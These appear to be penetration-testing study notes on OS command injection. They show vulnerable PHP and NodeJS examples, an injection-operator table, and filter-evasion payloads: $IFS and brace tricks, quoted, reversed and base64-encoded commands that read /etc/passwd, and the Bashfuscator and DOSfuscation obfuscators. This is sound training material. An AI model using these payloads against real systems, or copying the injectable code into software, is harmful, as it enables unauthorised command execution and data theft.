# Intro
Allows an attacker to execute commands on back-end hosting server.

Examples:

|Injection|Description|
|---|---|
|OS Command Injection|Occurs when user input is directly used as part of an OS command.|
|Code Injection|Occurs when user input is directly within a function that evaluates code.|
|SQL Injections|Occurs when user input is directly used as part of an SQL query.|
|Cross-Site Scripting/HTML Injection|Occurs when exact user input is displayed on a web page.|

## OS Command Injections 
All web programming languages have ways to execute OS commands.
### PHP example
```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```
### NodeJS Example
```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

# Detection 
* Attempt to append the command through various injection methods
### Command Injection Methods

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`               | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |

# Injecting Commands 
* Add something from the table above and attempt to execute a command. 
* Look on a browsers developer tools at the network tab for new network connections?
	* If a network operation occurs and nothing appears
## Bypassing Front-End Validation 
* Use a web proxy such as BurpSuite and then their repeater
## Common Operators
|**Injection Type**|**Operators**|
|---|---|
|SQL Injection|`'` `,` `;` `--` `/* */`|
|Command Injection|`;` `&&`|
|LDAP Injection|`*` `(` `)` `&` `\|`|
|XPath Injection|`'` `or` `and` `not` `substring` `concat` `count`|
|OS Command Injection|`;` `&` `\|`|
|Code Injection|`'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`|
|Directory Traversal/File Path Traversal|`../` `..\\` `%00`|
|Object Injection|`;` `&` `\|`|
|XQuery Injection|`'` `;` `--` `/* */`|
|Shellcode Injection|`\x` `\u` `%u` `%n`|
|Header Injection|`\n` `\r\n` `\t` `%0d` `%0a` `%09`|

# Filter Evasion
## Identifying Filters
### Filter/ WAF Detection
* Break down what you are a telling the server to do:
#### Example
`127.0.0.1; whoami`
1. A semi- colon
2. A white space
3. `whoami`

* A web application may have a list of black listed filters
```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```
#### Identifying Blacklisted Characters
Repeat requests through BurpSuite with different characters and see what gets excepted. 
## Bypassing Space Filters
[Full List](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)
### Blacklisted Operators
Try using allowed characters found above
### Blacklisted Spaces
Use tabs 
`%09`
### Using $IFS
`${IFS}` default value is space.
`127.0.0.1%0a${IFS}`
### Using Brace Expansion 
Automatically adds spaces between arguments wrapped between braces. 
`{ls,-la}`
Executes as 
`ls -la`

## Other Blacklisted Characters
* Slash or backslash is commonly blacklisted 
### Linux
Utilise Linux enviroment variables
```shell
echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

```shell
echo ${PATH:0:1}

/
```

```shell
echo ${LS_COLORS:10:1}

;
```
### Windows
List all enviroment variables
`Get-ChildItem Env`

```cmd
echo %HOMEPATH:~6,-11%

\
```

```powershell
$env:HOMEPATH[0]

\
```

### Character Shifting
Following command shifts the characters we pass by 1.
So find the character in the ASCII table that is before ours (can be found in `man ascii`) Then add it instead of `[` in the example. 
```shell
man ascii     # \ is on 92, before it is [ on 91


echo $(tr '!-}' '"-~'<<<[)
```
This can be done in powershell as well
## Bypassing Blacklisted Commands
 ```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```
### Linux and Windows
* Add characters that are usually ignored
* Such as `'` and `"`
```shell
w'h'o'am'i
w"h"o"am"i
```
Can't mix the quotes and the number must be even
### Linux Only 
Insert Linux characters in the middle. 
`\` `$@`
```bash
who$@ami
w\ho\am\i
```
These do not need to be even
### Windows Only
Insert Windows Only characters 
```cmd
who^ami
```
## Advanced Command Obfuscation 
### Case Manipulation
Change random cases of words
#### Windows
```PowerShell
WhOamI
```
#### Linux/ Bash
Is case sensitive 
```shell
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
May need to sort filtered spaces and special characters with this stuff

```bash
$(a="WhOaMi";printf %s "${a,,}")
```
###  Reversed Commands
#### Linux
```shell
 echo 'whoami' | rev
```
Burp Request
```shell
$(rev<<<'imaohw')
```
#### Windows
```powershell
"whoami"[-1..-20] -join ''
```
Burp Request 
```powershell
iex "$('imaohw'[-1..-20] -join '')"
```

### Encoded Commands
#### Linux 
Base64 or xxd encode commands 
```shell
echo -n 'cat /etc/passwd | grep 33' | base64
```
Burp Request 
```shell
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
Combine with other filtering if `bash` or `base64` is banned
#### Windows
```powershell
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```
## Evasion Tools
### Linux
#### Bashfuscator
```shell
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
python3 setup.py install --user
```

```shell
cd ./bashfuscator/bin/

./bashfuscator -h
```
Randomly picks a payload
```shell
./bashfuscator -c 'cat /etc/passwd'
```
Flags can make it simpler
```shell
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```
Execute with `bash -c`

#### Windows (DOSfuscation)
[Link](about:blank)
```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt

Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```
